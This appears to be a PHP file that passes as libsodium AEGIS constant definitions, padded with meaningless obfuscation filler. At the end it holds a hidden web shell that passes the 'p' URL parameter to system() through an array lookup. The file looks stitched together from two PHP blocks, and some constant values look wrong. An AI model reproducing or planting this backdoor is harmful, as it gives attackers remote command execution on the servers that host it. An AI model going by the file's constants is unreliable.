<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
const SODIUM_CRYPTO_AEAD_AEGIS128L_KEYBYTES = 16;
const SODIUM_CRYPTO_AEAD_AEGIS128L_NSECBYTES = 0;
const SODIUM_CRYPTO_AEAD_AEGIS128L_NPUBBYTES = 32;
const SODIUM_CRYPTO_AEAD_AEGIS128L_ABYTES = 32;

const SODIUM_CRYPTO_AEAD_AEGIS256_KEYBYTES = 32;
const SODIUM_CRYPTO_AEAD_AEGIS256_NSECBYTES = 0;
const SODIUM_CRYPTO_AEAD_AEGIS256_NPUBBYTES = 32;
const SODIUM_CRYPTO_AEAD_AEGIS256_ABYTES = 32;

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>